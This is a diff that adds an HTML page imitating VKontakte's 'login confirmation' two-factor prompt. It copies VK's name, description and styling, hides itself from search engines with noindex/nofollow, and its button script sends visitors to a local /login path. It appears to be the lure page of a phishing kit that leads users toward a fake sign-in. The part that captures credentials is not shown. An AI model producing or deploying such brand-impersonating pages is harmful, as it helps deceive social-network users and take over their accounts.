@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href=""><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                    <div class="container">
+                <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 48 48"><rect width="48" height="48" rx="24" fill="#48c248"></rect><rect x=".25" y=".25" width="47.5" height="47.5" rx="23.75" stroke="currentColor" stroke-opacity=".08" stroke-width=".5"></rect><path d="M24 11a6 6 0 016 6l.002 2.023c.843.052 1.38.2 1.935.496.663.355 1.19.881 1.544 1.544.385.72.519 1.413.519 2.783v6.308c0 1.37-.134 2.063-.519 2.783a3.726 3.726 0 01-1.544 1.544c-.72.385-1.413.519-2.783.519H18.846c-1.37 0-2.063-.134-2.783-.519a3.726 3.726 0 01-1.544-1.544c-.385-.72-.519-1.413-.519-2.783v-6.308c0-1.37.134-2.063.519-2.783a3.726 3.726 0 011.544-1.544c.555-.297 1.093-.444 1.936-.496L18 17a6 6 0 016-6zm5.154 10H18.846c-1.068 0-1.449.073-1.84.282-.314.169-.555.41-.724.724-.209.391-.282.772-.282 1.84v6.308c0 1.068.073 1.449.282 1.84.169.314.41.555.724.724.391.209.772.282 1.84.282h10.308c1.068 0 1.449-.073 1.84-.282.314-.169.555-.41.724-.724.209-.391.282-.772.282-1.84v-6.308c0-1.068-.073-1.449-.282-1.84a1.727 1.727 0 00-.724-.724c-.391-.209-.772-.282-1.84-.282zM24 24a1 1 0 011 1v3a1 1 0 11-2 0v-3a1 1 0 011-1zm0-11a4 4 0 00-4 4v2h8v-2a4 4 0 00-4-4z" fill="#fff"></path></svg>
+                <h1 class="title">Подтверждение входа</h1>
+                <p class="subtitle">Обеспечивает надёжную защиту от 
+взлома: для входа на страницу следует ввести одноразовый код, полученный
+ по SMS или иным подключённым способом.</p>
+                <button type="button" class="button"><span>Подключить</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+                                                                    </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+                window.location.href = "/login";
+            }, 500);
+        });
+    </script>
+
+</body></html>
